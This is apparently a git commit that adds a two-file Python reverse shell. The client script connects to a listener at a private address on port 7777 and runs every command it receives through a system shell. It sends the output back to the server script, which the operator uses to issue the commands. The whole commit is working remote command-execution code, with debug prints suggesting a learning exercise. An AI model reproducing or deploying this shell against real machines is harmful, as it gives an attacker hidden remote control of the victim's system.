d6bf252713aa65a078ef336ecbd0752e2b534855
Alek3498 <falexanderbc@gmail.com>
2024-04-17 20:15:09 -0300

    1st commit

---
+++ client.py
@@ -0,0 +1,33 @@
+import socket
+import os
+import subprocess
+
+def shell():
+    current_dir = os.getcwd()
+    print("-----------------------------------------")
+    print("Current dir:",current_dir)
+    print("Client type:", type(client),"->",id(client))
+    client.send(current_dir.encode())
+    while True:
+        res=client.recv(1024).decode().rstrip()
+        print("Resposta:",res)
+        if res == "exit":
+            print("Exit:",res)
+            break
+        elif res[:2]=="cd" and len(res) > 2:
+            print("Res:", res[3:])
+            os.chdir(res[3:])
+            result = os.getcwd()
+            client.send(result.encode())
+        else:
+            proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
+            result=proc.stdout.read()+proc.stderr.read()
+            if len(result) == 0:
+                client.send("1".encode())
+            else:
+                client.send(result)
+
+client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+client.connect(('10.42.0.1',7777))
+shell()
+client.close()
---
+++ server.py
@@ -0,0 +1,66 @@
+#-------------------------------------------------
+# SERVER SOCKET
+#-------------------------------------------------
+
+import socket
+
+
+def shell():
+    current_dir = target.recv(1024)
+    print("-----------------------------------------")
+    print("Entrando na função shell...")
+    print("current_dir",type(current_dir))
+    while True:
+        #command=raw_input("{}~#: ",format(current_dir))
+        print("Executando a função shell")
+        command = input("{}#: ".format(current_dir))
+        #command = input(format(current_dir))
+        print("Comando obtido",command)
+        if command == "exit":
+            target.send(command.encode())
+            print("Exit:",command.encode())
+            break
+        elif command[:2]=="cd":
+            target.send(command.encode())
+            res = target.recv(1024).decode().rstrip()
+            current_dir=res
+            print(res)
+        elif command=="":
+            pass
+        else:
+            target.send(command.encode())
+            res=target.recv(1024).decode().rstrip()
+            if res == "1":
+                continue
+            else:
+                print(format(res))
+
+def serverServ():
+    global server
+    global ip
+    global target
+
+    server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+    server.bind(('10.42.0.1',7777))
+    server.listen(1)
+    print("-----------------------------------------")
+    print("Server type:", type(server), "->", id(server))
+    print("Server:", server)
+    print("Server ligado e aguardando ligações...")
+    target,ip=server.accept()
+    print("-----------------------------------------")
+    print("Target type:", type(target), "->", id(target))
+    print("Target:",target)
+    print("Ligação recebida de:" + str(ip[0]))
+    print("Saindo da função serverServ")
+    print("-----------------------------------------")
+
+
+serverServ()
+shell()
+server.close()
+
+
+
+
